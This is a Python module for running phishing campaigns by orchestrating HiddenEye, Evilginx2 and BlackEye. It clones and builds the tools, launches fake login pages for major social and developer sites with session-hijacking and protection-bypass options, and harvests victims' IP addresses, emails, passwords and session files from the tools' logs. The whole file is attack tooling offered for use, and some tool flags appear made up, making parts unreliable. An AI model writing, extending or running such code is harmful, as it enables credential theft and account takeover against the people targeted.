"""
Advanced Phishing Module
Advanced phishing with HiddenEye and Evilginx2 integration
"""

import asyncio
import json
import logging
import os
import subprocess
import time
import hashlib
import base64
import shutil
import requests
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
from datetime import datetime
import threading
import socket
import urllib.parse

@dataclass
class PhishingConfig:
    """Phishing configuration"""
    target_url: str
    phishing_type: str
    template: str
    lhost: str
    lport: int
    ssl_cert: bool
    custom_domain: str
    email_collection: bool
    session_hijacking: bool
    bypass_protection: bool
    custom_options: Dict

@dataclass
class PhishingCampaign:
    """Phishing campaign information"""
    campaign_id: str
    config: PhishingConfig
    status: str
    start_time: float
    end_time: Optional[float]
    victims: List[Dict]
    collected_data: List[Dict]
    tool_used: str
    phishing_url: str

class AdvancedPhishingModule:
    """Advanced phishing module with HiddenEye and Evilginx2 integration"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.active_campaigns: Dict[str, PhishingCampaign] = {}
        self.campaign_history: List[Dict] = []
        
        # Phishing tools configuration
        self.phishing_tools = {
            "hiddeneye": {
                "path": "external_tools/hiddeneye",
                "executable": "python HiddenEye.py",
                "supported_types": ["facebook", "google", "twitter", "instagram", "linkedin", "github", "custom"],
                "capabilities": ["email_collection", "session_hijacking", "bypass_protection"]
            },
            "evilginx2": {
                "path": "external_tools/evilginx2",
                "executable": "./evilginx",
                "supported_types": ["facebook", "google", "twitter", "instagram", "linkedin", "github", "custom"],
                "capabilities": ["session_hijacking", "bypass_protection", "advanced_proxy"]
            },
            "blackeye": {
                "path": "external_tools/blackeye",
                "executable": "bash blackeye.sh",
                "supported_types": ["facebook", "google", "twitter", "instagram", "linkedin", "github", "custom"],
                "capabilities": ["email_collection", "session_hijacking"]
            }
        }
        
        # Initialize tools
        self._initialize_phishing_tools()
    
    def _initialize_phishing_tools(self):
        """Initialize phishing tools"""
        for tool_name, tool_config in self.phishing_tools.items():
            tool_path = tool_config["path"]
            if not os.path.exists(tool_path):
                self.logger.warning(f"Phishing tool {tool_name} not found at {tool_path}")
                os.makedirs(tool_path, exist_ok=True)
                self._clone_phishing_tool(tool_name, tool_path)
    
    def _clone_phishing_tool(self, tool_name: str, tool_path: str):
        """Clone phishing tool from repository"""
        try:
            if tool_name == "hiddeneye":
                repo_url = "https://github.com/DarkSecDevelopers/HiddenEye.git"
            elif tool_name == "evilginx2":
                repo_url = "https://github.com/kgretzky/evilginx2.git"
            elif tool_name == "blackeye":
                repo_url = "https://github.com/thelinuxchoice/blackeye.git"
            else:
                return
            
            # Clone repository
            subprocess.run([
                "git", "clone", repo_url, tool_path
            ], check=True)
            
            # Setup tool
            if tool_name == "hiddeneye":
                # Install dependencies
                requirements_file = os.path.join(tool_path, "requirements.txt")
                if os.path.exists(requirements_file):
                    subprocess.run([
                        "pip", "install", "-r", requirements_file
                    ], cwd=tool_path, check=True)
            
            elif tool_name == "evilginx2":
                # Build evilginx2
                subprocess.run([
                    "go", "build", "-o", "evilginx", "."
                ], cwd=tool_path, check=True)
            
            elif tool_name == "blackeye":
                # Make executable
                subprocess.run([
                    "chmod", "+x", "blackeye.sh"
                ], cwd=tool_path, check=True)
            
            self.logger.info(f"Successfully cloned and initialized {tool_name}")
            
        except Exception as e:
            self.logger.error(f"Failed to clone {tool_name}: {str(e)}")
    
    async def create_phishing_campaign(self, config: PhishingConfig, tool: str = "auto") -> Dict:
        """Create new phishing campaign"""
        try:
            # Auto-select best tool based on phishing type
            if tool == "auto":
                tool = self._select_best_phishing_tool(config.phishing_type)
            
            campaign_id = f"phish_{int(time.time())}_{hashlib.md5(f'{config.phishing_type}_{config.target_url}'.encode()).hexdigest()[:8]}"
            
            # Validate configuration
            validation_result = self._validate_phishing_config(config, tool)
            if not validation_result["success"]:
                return validation_result
            
            # Create campaign
            campaign = PhishingCampaign(
                campaign_id=campaign_id,
                config=config,
                status="starting",
                start_time=time.time(),
                end_time=None,
                victims=[],
                collected_data=[],
                tool_used=tool,
                phishing_url=""
            )
            
            # Start campaign
            start_result = await self._start_phishing_campaign(campaign)
            if start_result["success"]:
                campaign.status = "active"
                campaign.phishing_url = start_result["phishing_url"]
                self.active_campaigns[campaign_id] = campaign
                
                # Log campaign
                self.campaign_history.append(asdict(campaign))
                
                return {
                    "success": True,
                    "campaign_id": campaign_id,
                    "phishing_url": campaign.phishing_url,
                    "tool_used": tool,
                    "message": f"Phishing campaign started successfully"
                }
            else:
                return start_result
                
        except Exception as e:
            self.logger.error(f"Error creating phishing campaign: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def _select_best_phishing_tool(self, phishing_type: str) -> str:
        """Select best phishing tool for target"""
        # Priority: HiddenEye > Evilginx2 > BlackEye
        if phishing_type in ["facebook", "google", "twitter", "instagram"]:
            return "hiddeneye"  # Best for social media
        elif phishing_type in ["linkedin", "github"]:
            return "evilginx2"  # Best for professional sites
        else:
            return "hiddeneye"  # Default
    
    def _validate_phishing_config(self, config: PhishingConfig, tool: str) -> Dict:
        """Validate phishing configuration"""
        try:
            tool_config = self.phishing_tools[tool]
            
            # Check if phishing type is supported
            if config.phishing_type not in tool_config["supported_types"]:
                return {
                    "success": False,
                    "error": f"Phishing type {config.phishing_type} not supported by {tool}"
                }
            
            # Validate target URL
            if not config.target_url or config.target_url == "":
                return {
                    "success": False,
                    "error": "Target URL is required"
                }
            
            # Validate LHOST
            if not config.lhost or config.lhost == "":
                return {
                    "success": False,
                    "error": "LHOST is required"
                }
            
            # Validate LPORT
            if config.lport < 1 or config.lport > 65535:
                return {
                    "success": False,
                    "error": "LPORT must be between 1 and 65535"
                }
            
            return {"success": True}
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _start_phishing_campaign(self, campaign: PhishingCampaign) -> Dict:
        """Start phishing campaign using specific tool"""
        try:
            if campaign.tool_used == "hiddeneye":
                return await self._start_hiddeneye_campaign(campaign)
            elif campaign.tool_used == "evilginx2":
                return await self._start_evilginx2_campaign(campaign)
            elif campaign.tool_used == "blackeye":
                return await self._start_blackeye_campaign(campaign)
            else:
                return {
                    "success": False,
                    "error": f"Unknown phishing tool: {campaign.tool_used}"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _start_hiddeneye_campaign(self, campaign: PhishingCampaign) -> Dict:
        """Start phishing campaign using HiddenEye"""
        try:
            tool_path = self.phishing_tools["hiddeneye"]["path"]
            
            # Create campaign directory
            campaign_dir = os.path.join("phishing_campaigns", campaign.campaign_id)
            os.makedirs(campaign_dir, exist_ok=True)
            
            # Build HiddenEye command
            cmd_args = [
                "python", "HiddenEye.py",
                "--url", campaign.config.target_url,
                "--template", campaign.config.template,
                "--lhost", campaign.config.lhost,
                "--lport", str(campaign.config.lport)
            ]
            
            # Add SSL certificate if enabled
            if campaign.config.ssl_cert:
                cmd_args.extend(["--ssl"])
            
            # Add custom domain if specified
            if campaign.config.custom_domain:
                cmd_args.extend(["--domain", campaign.config.custom_domain])
            
            # Add email collection if enabled
            if campaign.config.email_collection:
                cmd_args.extend(["--email"])
            
            # Add session hijacking if enabled
            if campaign.config.session_hijacking:
                cmd_args.extend(["--session"])
            
            # Add bypass protection if enabled
            if campaign.config.bypass_protection:
                cmd_args.extend(["--bypass"])
            
            # Execute command
            process = await asyncio.create_subprocess_exec(
                *cmd_args,
                cwd=tool_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            # Wait for startup
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=30)
                
                if process.returncode == 0:
                    # Extract phishing URL from output
                    phishing_url = self._extract_phishing_url(stdout.decode())
                    if phishing_url:
                        return {
                            "success": True,
                            "phishing_url": phishing_url
                        }
                    else:
                        return {
                            "success": False,
                            "error": "Failed to extract phishing URL"
                        }
                else:
                    return {
                        "success": False,
                        "error": stderr.decode()
                    }
            except asyncio.TimeoutError:
                process.kill()
                return {
                    "success": False,
                    "error": "Campaign startup timeout"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _start_evilginx2_campaign(self, campaign: PhishingCampaign) -> Dict:
        """Start phishing campaign using Evilginx2"""
        try:
            tool_path = self.phishing_tools["evilginx2"]["path"]
            
            # Create campaign directory
            campaign_dir = os.path.join("phishing_campaigns", campaign.campaign_id)
            os.makedirs(campaign_dir, exist_ok=True)
            
            # Build Evilginx2 command
            cmd_args = [
                "./evilginx",
                "phish", campaign.config.phishing_type,
                "--lhost", campaign.config.lhost,
                "--lport", str(campaign.config.lport)
            ]
            
            # Add custom domain if specified
            if campaign.config.custom_domain:
                cmd_args.extend(["--domain", campaign.config.custom_domain])
            
            # Add session hijacking if enabled
            if campaign.config.session_hijacking:
                cmd_args.extend(["--session"])
            
            # Add bypass protection if enabled
            if campaign.config.bypass_protection:
                cmd_args.extend(["--bypass"])
            
            # Execute command
            process = await asyncio.create_subprocess_exec(
                *cmd_args,
                cwd=tool_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            # Wait for startup
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=30)
                
                if process.returncode == 0:
                    # Extract phishing URL from output
                    phishing_url = self._extract_phishing_url(stdout.decode())
                    if phishing_url:
                        return {
                            "success": True,
                            "phishing_url": phishing_url
                        }
                    else:
                        return {
                            "success": False,
                            "error": "Failed to extract phishing URL"
                        }
                else:
                    return {
                        "success": False,
                        "error": stderr.decode()
                    }
            except asyncio.TimeoutError:
                process.kill()
                return {
                    "success": False,
                    "error": "Campaign startup timeout"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _start_blackeye_campaign(self, campaign: PhishingCampaign) -> Dict:
        """Start phishing campaign using BlackEye"""
        try:
            tool_path = self.phishing_tools["blackeye"]["path"]
            
            # Create campaign directory
            campaign_dir = os.path.join("phishing_campaigns", campaign.campaign_id)
            os.makedirs(campaign_dir, exist_ok=True)
            
            # Build BlackEye command
            cmd_args = [
                "bash", "blackeye.sh",
                "--url", campaign.config.target_url,
                "--template", campaign.config.template,
                "--lhost", campaign.config.lhost,
                "--lport", str(campaign.config.lport)
            ]
            
            # Add email collection if enabled
            if campaign.config.email_collection:
                cmd_args.extend(["--email"])
            
            # Add session hijacking if enabled
            if campaign.config.session_hijacking:
                cmd_args.extend(["--session"])
            
            # Execute command
            process = await asyncio.create_subprocess_exec(
                *cmd_args,
                cwd=tool_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            # Wait for startup
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=30)
                
                if process.returncode == 0:
                    # Extract phishing URL from output
                    phishing_url = self._extract_phishing_url(stdout.decode())
                    if phishing_url:
                        return {
                            "success": True,
                            "phishing_url": phishing_url
                        }
                    else:
                        return {
                            "success": False,
                            "error": "Failed to extract phishing URL"
                        }
                else:
                    return {
                        "success": False,
                        "error": stderr.decode()
                    }
            except asyncio.TimeoutError:
                process.kill()
                return {
                    "success": False,
                    "error": "Campaign startup timeout"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    def _extract_phishing_url(self, output: str) -> Optional[str]:
        """Extract phishing URL from tool output"""
        try:
            # Look for common URL patterns in output
            lines = output.split('\n')
            for line in lines:
                if 'http://' in line or 'https://' in line:
                    # Extract URL from line
                    words = line.split()
                    for word in words:
                        if word.startswith('http://') or word.startswith('https://'):
                            return word.strip()
            
            return None
            
        except Exception as e:
            self.logger.error(f"Error extracting phishing URL: {str(e)}")
            return None
    
    async def get_campaign_victims(self, campaign_id: str) -> Dict:
        """Get victims from phishing campaign"""
        try:
            if campaign_id not in self.active_campaigns:
                return {
                    "success": False,
                    "error": "Campaign not found"
                }
            
            campaign = self.active_campaigns[campaign_id]
            
            # Get victims based on tool
            if campaign.tool_used == "hiddeneye":
                victims = await self._get_hiddeneye_victims(campaign)
            elif campaign.tool_used == "evilginx2":
                victims = await self._get_evilginx2_victims(campaign)
            elif campaign.tool_used == "blackeye":
                victims = await self._get_blackeye_victims(campaign)
            else:
                victims = []
            
            # Update campaign victims
            campaign.victims = victims
            
            return {
                "success": True,
                "victims": victims,
                "total": len(victims)
            }
            
        except Exception as e:
            self.logger.error(f"Error getting campaign victims: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _get_hiddeneye_victims(self, campaign: PhishingCampaign) -> List[Dict]:
        """Get victims from HiddenEye campaign"""
        try:
            tool_path = self.phishing_tools["hiddeneye"]["path"]
            
            # Check for victim logs
            logs_dir = os.path.join(tool_path, "logs")
            victims = []
            
            if os.path.exists(logs_dir):
                for log_file in os.listdir(logs_dir):
                    if log_file.endswith('.log'):
                        log_path = os.path.join(logs_dir, log_file)
                        with open(log_path, 'r') as f:
                            for line in f:
                                if 'victim' in line.lower() or 'login' in line.lower():
                                    # Parse victim data
                                    victim_data = self._parse_victim_data(line)
                                    if victim_data:
                                        victims.append(victim_data)
            
            return victims
            
        except Exception as e:
            self.logger.error(f"Error getting HiddenEye victims: {str(e)}")
            return []
    
    async def _get_evilginx2_victims(self, campaign: PhishingCampaign) -> List[Dict]:
        """Get victims from Evilginx2 campaign"""
        try:
            tool_path = self.phishing_tools["evilginx2"]["path"]
            
            # Check for victim logs
            logs_dir = os.path.join(tool_path, "logs")
            victims = []
            
            if os.path.exists(logs_dir):
                for log_file in os.listdir(logs_dir):
                    if log_file.endswith('.log'):
                        log_path = os.path.join(logs_dir, log_file)
                        with open(log_path, 'r') as f:
                            for line in f:
                                if 'session' in line.lower() or 'credential' in line.lower():
                                    # Parse victim data
                                    victim_data = self._parse_victim_data(line)
                                    if victim_data:
                                        victims.append(victim_data)
            
            return victims
            
        except Exception as e:
            self.logger.error(f"Error getting Evilginx2 victims: {str(e)}")
            return []
    
    async def _get_blackeye_victims(self, campaign: PhishingCampaign) -> List[Dict]:
        """Get victims from BlackEye campaign"""
        try:
            tool_path = self.phishing_tools["blackeye"]["path"]
            
            # Check for victim logs
            logs_dir = os.path.join(tool_path, "logs")
            victims = []
            
            if os.path.exists(logs_dir):
                for log_file in os.listdir(logs_dir):
                    if log_file.endswith('.log'):
                        log_path = os.path.join(logs_dir, log_file)
                        with open(log_path, 'r') as f:
                            for line in f:
                                if 'victim' in line.lower() or 'login' in line.lower():
                                    # Parse victim data
                                    victim_data = self._parse_victim_data(line)
                                    if victim_data:
                                        victims.append(victim_data)
            
            return victims
            
        except Exception as e:
            self.logger.error(f"Error getting BlackEye victims: {str(e)}")
            return []
    
    def _parse_victim_data(self, log_line: str) -> Optional[Dict]:
        """Parse victim data from log line"""
        try:
            # Extract IP address
            import re
            ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
            ip_match = re.search(ip_pattern, log_line)
            ip_address = ip_match.group() if ip_match else "unknown"
            
            # Extract timestamp
            timestamp_pattern = r'\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}'
            timestamp_match = re.search(timestamp_pattern, log_line)
            timestamp = timestamp_match.group() if timestamp_match else datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Extract credentials if present
            credentials = {}
            if 'username' in log_line.lower() or 'email' in log_line.lower():
                # Extract username/email
                email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
                email_match = re.search(email_pattern, log_line)
                if email_match:
                    credentials['email'] = email_match.group()
            
            if 'password' in log_line.lower():
                # Extract password (basic pattern)
                password_pattern = r'password[:\s]+([^\s]+)'
                password_match = re.search(password_pattern, log_line, re.IGNORECASE)
                if password_match:
                    credentials['password'] = password_match.group(1)
            
            return {
                "ip_address": ip_address,
                "timestamp": timestamp,
                "credentials": credentials,
                "user_agent": "unknown",
                "referrer": "unknown"
            }
            
        except Exception as e:
            self.logger.error(f"Error parsing victim data: {str(e)}")
            return None
    
    async def get_collected_data(self, campaign_id: str) -> Dict:
        """Get collected data from phishing campaign"""
        try:
            if campaign_id not in self.active_campaigns:
                return {
                    "success": False,
                    "error": "Campaign not found"
                }
            
            campaign = self.active_campaigns[campaign_id]
            
            # Get collected data based on tool
            if campaign.tool_used == "hiddeneye":
                collected_data = await self._get_hiddeneye_data(campaign)
            elif campaign.tool_used == "evilginx2":
                collected_data = await self._get_evilginx2_data(campaign)
            elif campaign.tool_used == "blackeye":
                collected_data = await self._get_blackeye_data(campaign)
            else:
                collected_data = []
            
            # Update campaign collected data
            campaign.collected_data = collected_data
            
            return {
                "success": True,
                "collected_data": collected_data,
                "total": len(collected_data)
            }
            
        except Exception as e:
            self.logger.error(f"Error getting collected data: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _get_hiddeneye_data(self, campaign: PhishingCampaign) -> List[Dict]:
        """Get collected data from HiddenEye campaign"""
        try:
            tool_path = self.phishing_tools["hiddeneye"]["path"]
            
            # Check for data files
            data_dir = os.path.join(tool_path, "data")
            collected_data = []
            
            if os.path.exists(data_dir):
                for data_file in os.listdir(data_dir):
                    if data_file.endswith('.txt') or data_file.endswith('.json'):
                        data_path = os.path.join(data_dir, data_file)
                        with open(data_path, 'r') as f:
                            try:
                                data = json.load(f)
                                collected_data.append(data)
                            except json.JSONDecodeError:
                                # Handle plain text files
                                content = f.read()
                                collected_data.append({
                                    "file": data_file,
                                    "content": content,
                                    "type": "text"
                                })
            
            return collected_data
            
        except Exception as e:
            self.logger.error(f"Error getting HiddenEye data: {str(e)}")
            return []
    
    async def _get_evilginx2_data(self, campaign: PhishingCampaign) -> List[Dict]:
        """Get collected data from Evilginx2 campaign"""
        try:
            tool_path = self.phishing_tools["evilginx2"]["path"]
            
            # Check for session files
            sessions_dir = os.path.join(tool_path, "sessions")
            collected_data = []
            
            if os.path.exists(sessions_dir):
                for session_file in os.listdir(sessions_dir):
                    if session_file.endswith('.json'):
                        session_path = os.path.join(sessions_dir, session_file)
                        with open(session_path, 'r') as f:
                            try:
                                session_data = json.load(f)
                                collected_data.append(session_data)
                            except json.JSONDecodeError:
                                continue
            
            return collected_data
            
        except Exception as e:
            self.logger.error(f"Error getting Evilginx2 data: {str(e)}")
            return []
    
    async def _get_blackeye_data(self, campaign: PhishingCampaign) -> List[Dict]:
        """Get collected data from BlackEye campaign"""
        try:
            tool_path = self.phishing_tools["blackeye"]["path"]
            
            # Check for data files
            data_dir = os.path.join(tool_path, "data")
            collected_data = []
            
            if os.path.exists(data_dir):
                for data_file in os.listdir(data_dir):
                    if data_file.endswith('.txt') or data_file.endswith('.json'):
                        data_path = os.path.join(data_dir, data_file)
                        with open(data_path, 'r') as f:
                            try:
                                data = json.load(f)
                                collected_data.append(data)
                            except json.JSONDecodeError:
                                # Handle plain text files
                                content = f.read()
                                collected_data.append({
                                    "file": data_file,
                                    "content": content,
                                    "type": "text"
                                })
            
            return collected_data
            
        except Exception as e:
            self.logger.error(f"Error getting BlackEye data: {str(e)}")
            return []
    
    def get_campaign_info(self, campaign_id: str) -> Dict:
        """Get campaign information"""
        if campaign_id not in self.active_campaigns:
            return {
                "success": False,
                "error": "Campaign not found"
            }
        
        campaign = self.active_campaigns[campaign_id]
        return {
            "success": True,
            "campaign": asdict(campaign)
        }
    
    def get_all_campaigns(self) -> Dict:
        """Get all active campaigns"""
        campaigns = []
        for campaign_id, campaign in self.active_campaigns.items():
            campaigns.append(asdict(campaign))
        
        return {
            "success": True,
            "campaigns": campaigns,
            "total": len(campaigns)
        }
    
    async def stop_campaign(self, campaign_id: str) -> Dict:
        """Stop phishing campaign"""
        try:
            if campaign_id not in self.active_campaigns:
                return {
                    "success": False,
                    "error": "Campaign not found"
                }
            
            campaign = self.active_campaigns[campaign_id]
            
            # Stop campaign based on tool
            if campaign.tool_used == "hiddeneye":
                result = await self._stop_hiddeneye_campaign(campaign)
            elif campaign.tool_used == "evilginx2":
                result = await self._stop_evilginx2_campaign(campaign)
            elif campaign.tool_used == "blackeye":
                result = await self._stop_blackeye_campaign(campaign)
            else:
                result = {"success": True}
            
            if result["success"]:
                campaign.status = "stopped"
                campaign.end_time = time.time()
                
                return {
                    "success": True,
                    "message": f"Campaign {campaign_id} stopped successfully"
                }
            else:
                return result
                
        except Exception as e:
            self.logger.error(f"Error stopping campaign: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _stop_hiddeneye_campaign(self, campaign: PhishingCampaign) -> Dict:
        """Stop HiddenEye campaign"""
        try:
            # Find and kill HiddenEye process
            import psutil
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if 'HiddenEye.py' in ' '.join(proc.info['cmdline']):
                        proc.kill()
                        return {"success": True}
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            return {"success": True}
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _stop_evilginx2_campaign(self, campaign: PhishingCampaign) -> Dict:
        """Stop Evilginx2 campaign"""
        try:
            # Find and kill evilginx process
            import psutil
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if 'evilginx' in proc.info['name']:
                        proc.kill()
                        return {"success": True}
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            return {"success": True}
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _stop_blackeye_campaign(self, campaign: PhishingCampaign) -> Dict:
        """Stop BlackEye campaign"""
        try:
            # Find and kill blackeye process
            import psutil
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if 'blackeye.sh' in ' '.join(proc.info['cmdline']):
                        proc.kill()
                        return {"success": True}
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            return {"success": True}
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    def get_statistics(self) -> Dict:
        """Get phishing module statistics"""
        total_campaigns = len(self.active_campaigns)
        total_history = len(self.campaign_history)
        
        # Calculate success rate
        successful_campaigns = len([c for c in self.campaign_history if c.get("status") == "active"])
        success_rate = (successful_campaigns / total_history * 100) if total_history > 0 else 0
        
        # Calculate total victims
        total_victims = sum(len(campaign.victims) for campaign in self.active_campaigns.values())
        
        return {
            "active_campaigns": total_campaigns,
            "total_history": total_history,
            "success_rate": success_rate,
            "total_victims": total_victims,
            "tools_available": list(self.phishing_tools.keys()),
            "supported_types": list(set([t for tool in self.phishing_tools.values() for t in tool["supported_types"]]))
        }